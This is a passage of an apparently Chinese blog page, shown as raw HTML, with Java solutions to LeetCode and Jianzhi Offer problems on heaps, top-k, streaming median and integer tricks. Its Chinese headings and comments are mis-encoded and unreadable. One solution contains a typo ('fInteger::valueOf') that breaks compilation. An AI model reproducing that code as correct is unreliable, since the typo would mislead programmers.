<span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> i * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="keyword">if</span> (l &lt; heapSize &amp;&amp; nums[l] &gt; nums[max]) &#123;</span><br><span class="line">            max = l;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; heapSize &amp;&amp; nums[r] &gt; nums[max]) &#123;</span><br><span class="line">            max = r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (max != i) &#123;</span><br><span class="line">            swap(nums, i, max);</span><br><span class="line">            maxHeapify(nums, max, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildMaxHeap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> heapSize)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> heapSize / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxHeapify(nums, i, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> nums[a];</span><br><span class="line">        nums[a] = nums[b];</span><br><span class="line">        nums[b] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="23-åˆå¹¶Kä¸ªå‡åºé“¾è¡¨-x2F-x2F"><a href="#23-åˆå¹¶Kä¸ªå‡åºé“¾è¡¨-x2F-x2F" class="headerlink" title="23. åˆå¹¶Kä¸ªå‡åºé“¾è¡¨&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-k-sorted-lists/">23. åˆå¹¶Kä¸ªå‡åºé“¾è¡¨</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨å †</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y)-&gt; x.val - y.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lists.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(lists[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            tail.next = node;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            <span class="keyword">if</span> (node.next != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(node.next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="347-å‰-K-ä¸ªé«˜é¢‘å…ƒç´ "><a href="#347-å‰-K-ä¸ªé«˜é¢‘å…ƒç´ " class="headerlink" title="347. å‰ K ä¸ªé«˜é¢‘å…ƒç´ "></a><a href="https://leetcode-cn.com/problems/top-k-frequent-elements/">347. å‰ K ä¸ªé«˜é¢‘å…ƒç´ </a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// topk ï¼ˆå‰kå¤§ï¼‰ç”¨å°æ ¹å †ï¼Œç»´æŠ¤å †å¤§å°ä¸è¶…è¿‡ k å³å¯ã€‚æ¯æ¬¡å‹å…¥å †å‰å’Œå †é¡¶å…ƒç´ æ¯”è¾ƒï¼Œå¦‚æœæ¯”å †é¡¶å…ƒç´ è¿˜å°ï¼Œç›´æ¥æ‰”æ‰ï¼Œå¦åˆ™å‹å…¥å †ã€‚æ£€æŸ¥å †å¤§å°æ˜¯å¦è¶…è¿‡ kï¼Œå¦‚æœè¶…è¿‡ï¼Œå¼¹å‡ºå †é¡¶ã€‚å¤æ‚åº¦æ˜¯ nlogk</span></span><br><span class="line"><span class="comment">// é¿å…ä½¿ç”¨å¤§æ ¹å †ï¼Œå› ä¸ºä½ å¾—æŠŠæ‰€æœ‰å…ƒç´ å‹å…¥å †ï¼Œå¤æ‚åº¦æ˜¯ nlognï¼Œè€Œä¸”è¿˜æµªè´¹å†…å­˜ã€‚å¦‚æœæ˜¯æµ·é‡å…ƒç´ ï¼Œé‚£å°±æŒ‚äº†ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y) -&gt; map.get(x) - map.get(y));</span><br><span class="line">        <span class="keyword">for</span> (Integer key :</span><br><span class="line">                map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pq.size() &lt; k) &#123;</span><br><span class="line">                pq.add(key);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (map.get(pq.peek()) &lt; map.get(key)) &#123;</span><br><span class="line">                pq.remove();</span><br><span class="line">                pq.add(key);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!pq.isEmpty()) &#123;</span><br><span class="line">            res[i--] = pq.remove();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¡¶æ’åº</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt;[] lists = <span class="keyword">new</span> <span class="title class_">List</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (Integer key :</span><br><span class="line">                map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[map.get(key)] == <span class="literal">null</span>) &#123;</span><br><span class="line">                lists[map.get(key)] = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line">            lists[map.get(key)].add(key);</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length; i &gt; <span class="number">0</span> &amp;&amp; list.size() &lt; k; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.addAll(lists[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.stream().mapToInt(fInteger::valueOf).toArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å‰‘æŒ‡-Offer-41-æ•°æ®æµä¸­çš„ä¸­ä½æ•°"><a href="#å‰‘æŒ‡-Offer-41-æ•°æ®æµä¸­çš„ä¸­ä½æ•°" class="headerlink" title="å‰‘æŒ‡ Offer 41. æ•°æ®æµä¸­çš„ä¸­ä½æ•°"></a><a href="https://leetcode-cn.com/problems/shu-ju-liu-zhong-de-zhong-wei-shu-lcof/">å‰‘æŒ‡ Offer 41. æ•°æ®æµä¸­çš„ä¸­ä½æ•°</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç”¨å¤§é¡¶å †+å°é¡¶å †æ–¹æ³•ï¼Œå¯ä»¥çœ‹ä½œå¤§é¡¶å †æ˜¯æ™®é€šç­ï¼Œå°é¡¶å †æ˜¯å®éªŒç­ã€‚æ•°é‡ä¸Šæ—¶åˆ»ä¿æŒ å°é¡¶-å¤§é¡¶&lt;=1ï¼ˆä¸¤å †ç›¸ç­‰æˆ–è€…å°é¡¶æ¯”å¤§é¡¶å¤šä¸€ä¸ªï¼‰ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æ–°å­¦ç”Ÿå…ˆå…¥æ™®é€šç­ï¼ˆå¤§é¡¶å †ï¼‰ï¼Œæ­¤æ—¶å¯èƒ½ä¼šå¤±å»å¹³è¡¡äº†ï¼Œäºæ˜¯å–å¤§é¡¶å †çš„ç¬¬ä¸€ä¸ªï¼ˆç­é‡Œæœ€å¥½çš„å­¦ç”Ÿï¼‰åŠ å…¥å®éªŒç­ï¼ˆå°é¡¶å †ï¼‰ï¼Œåˆ¤æ–­è‹¥æ•°é‡è¿‡å¤šï¼ˆä¸æ˜¯ç­‰äºæˆ–å¤šä¸€ä¸ªï¼‰ï¼Œå–ç¬¬ä¸€ä¸ªï¼ˆå®éªŒç­é‡Œæœ€å·®çš„å­¦ç”Ÿï¼‰åˆ°æ™®é€šç­ï¼ˆå¤§é¡¶å †ï¼‰é‡Œã€‚ å–ä¸­ä½æ•°çš„æ—¶å€™ï¼Œè‹¥ä¸¤å †æ•°é‡ç›¸ç­‰ï¼Œåˆ™å„å–å †é¡¶å–å¹³å‡ï¼Œè‹¥å°é¡¶æ¯”å¤§é¡¶å¤šä¸€ï¼Œåˆ™å¤šçš„é‚£ä¸€ä¸ªå°±æ˜¯ä¸­ä½æ•°ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MedianFinder</span> &#123;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; left;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; right;</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MedianFinder</span><span class="params">()</span> &#123;</span><br><span class="line">        left = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y)-&gt; y - x);</span><br><span class="line">        right = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="comment">// ä»å·¦è¾¹åŠ ,ç„¶åå†åŠ åˆ°å³è¾¹</span></span><br><span class="line">        left.add(num);</span><br><span class="line">        right.add(left.poll());</span><br><span class="line">        <span class="keyword">if</span> (left.size() + <span class="number">1</span> &lt; right.size()) &#123;</span><br><span class="line">            left.add(right.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedian</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (right.size() &gt; left.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> right.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>) (left.peek() + right.peek()) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ•°å­¦"><a href="#æ•°å­¦" class="headerlink" title="æ•°å­¦"></a>æ•°å­¦</h2><h3 id="7-æ•´æ•°åè½¬"><a href="#7-æ•´æ•°åè½¬" class="headerlink" title="7. æ•´æ•°åè½¬"></a><a href="https://leetcode-cn.com/problems/reverse-integer/">7. æ•´æ•°åè½¬</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">pop</span> <span class="operator">=</span> x % <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">if</span> (ans &gt; Integer.MAX_VALUE / <span class="number">10</span> || ans &lt; Integer.MIN_VALUE / <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ans = ans * <span class="number">10</span> + pop;</span><br><span class="line">      x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-å›æ–‡æ•°-x2F"><a href="#9-å›æ–‡æ•°-x2F" class="headerlink" title="9. å›æ–‡æ•°&#x2F;"></a><a href="https://leetcode-cn.com/problems/palindrome-number/">9. å›æ–‡æ•°</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> x;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">      i = i * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">      x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">return</span> <span class="variable">tmp</span> <span class="operator">=</span>= i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="292-Nim-æ¸¸æˆ-x2F"><a href="#292-Nim-æ¸¸æˆ-x2F" class="headerlink" title="292. Nim æ¸¸æˆ&#x2F;"></a><a href="https://leetcode-cn.com/problems/nim-game/">292. Nim æ¸¸æˆ</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canWinNim</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (n % <span class="number">4</span>) != <span class="number">0</span>;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-62-åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—"><a href="#å‰‘æŒ‡-Offer-62-åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—" class="headerlink" title="å‰‘æŒ‡ Offer 62. åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">å‰‘æŒ‡ Offer 62. åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°å­—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            list.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            index = (index + m - <span class="number">1</span>) % n;</span><br><span class="line">            list.remove(index);</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">åªå…³å¿ƒæœ€ç»ˆæ´»ç€é‚£ä¸ªäººçš„åºå·å˜åŒ–</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">å®é™…åªç”¨å…³å¿ƒGçš„ç§»åŠ¨ï¼Œä¸ç”¨åœ¨æ„å“ªæ­¥è°ä¼šè¢«æ€ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// æœ€åä¸€è½®å‰©ä¸‹2ä¸ªäººï¼Œæ‰€ä»¥ä»2å¼€å§‹åæ¨</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            ans = (ans + m) % i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="371-ä¸¤æ•´æ•°ä¹‹å’Œ"><a href="#371-ä¸¤æ•´æ•°ä¹‹å’Œ" class="headerlink" title="371. ä¸¤æ•´æ•°ä¹‹å’Œ"></a><a href="https://leetcode-cn.com/problems/sum-of-two-integers/">371. ä¸¤æ•´æ•°ä¹‹å’Œ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸¤ä¸ªæ•´æ•°a, b; a ^ bæ˜¯æ— è¿›ä½çš„ç›¸åŠ ï¼› a&amp;bå¾—åˆ°æ¯ä¸€ä½çš„è¿›ä½ï¼›è®©æ— è¿›ä½ç›¸åŠ çš„ç»“æœä¸è¿›ä½ä¸æ–­çš„å¼‚æˆ–ï¼Œ ç›´åˆ°è¿›ä½ä¸º0ï¼›</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> sum, carry;</span><br><span class="line">        sum = a ^ b;</span><br><span class="line">        carry = (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> getSum(sum, carry);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-20-è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²"><a href="#å‰‘æŒ‡-Offer-20-è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²" class="headerlink" title="å‰‘æŒ‡ Offer 20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²"></a><a href="https://leetcode-cn.com/problems/biao-shi-shu-zhi-de-zi-fu-chuan-lcof/">å‰‘æŒ‡ Offer 20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">â€˜.â€™å‡ºç°æ­£ç¡®æƒ…å†µï¼šåªå‡ºç°ä¸€æ¬¡ï¼Œä¸”åœ¨eçš„å‰é¢</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">â€˜eâ€™å‡ºç°æ­£ç¡®æƒ…å†µï¼šåªå‡ºç°ä¸€æ¬¡ï¼Œä¸”å‡ºç°å‰æœ‰æ•°å­—</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">â€˜+â€™â€˜-â€™å‡ºç°æ­£ç¡®æƒ…å†µï¼šåªèƒ½åœ¨å¼€å¤´å’Œeåä¸€ä½</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isNumber</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s = s.trim();</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">numFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">eFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">dotFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; sc[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                numFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; !dotFlag &amp;&amp; !eFlag) &#123;</span><br><span class="line">                dotFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((sc[i] == <span class="string">&#x27;e&#x27;</span> || sc[i] == <span class="string">&#x27;E&#x27;</span>) &amp;&amp; !eFlag &amp;&amp; numFlag) &#123;</span><br><span class="line">                eFlag = <span class="literal">true</span>;</span><br><span class="line">                numFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((sc[i] == <span class="string">&#x27;+&#x27;</span> || sc[i] == <span class="string">&#x27;-&#x27;</span>) &amp;&amp; (i == <span class="number">0</span> || sc[i - <span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> || sc[i - <span class="number">1</span>] == <span class="string">&#x27;E&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numFlag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-64-æ±‚1-2-â€¦-n"><a href="#å‰‘æŒ‡-Offer-64-æ±‚1-2-â€¦-n" class="headerlink" title="å‰‘æŒ‡ Offer 64. æ±‚1+2+â€¦+n"></a><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/">å‰‘æŒ‡ Offer 64. æ±‚1+2+â€¦+n</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumNums</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">x</span> <span class="operator">=</span> n &gt; <span class="number">1</span> &amp;&amp; (n += sumNums(n - <span class="number">1</span>)) &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-56-I-æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°"><a href="#å‰‘æŒ‡-Offer-56-I-æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°" class="headerlink" title="å‰‘æŒ‡ Offer 56 - I. æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/">å‰‘æŒ‡ Offer 56 - I. æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡maskåˆ†ä¸º2ç»„</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] singleNumbers(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            k = k ^ nums[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> ((mask &amp; k) == <span class="number">0</span>) &#123;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((num &amp; mask) == <span class="number">0</span>) &#123;</span><br><span class="line">                a ^= num;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b ^= num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span 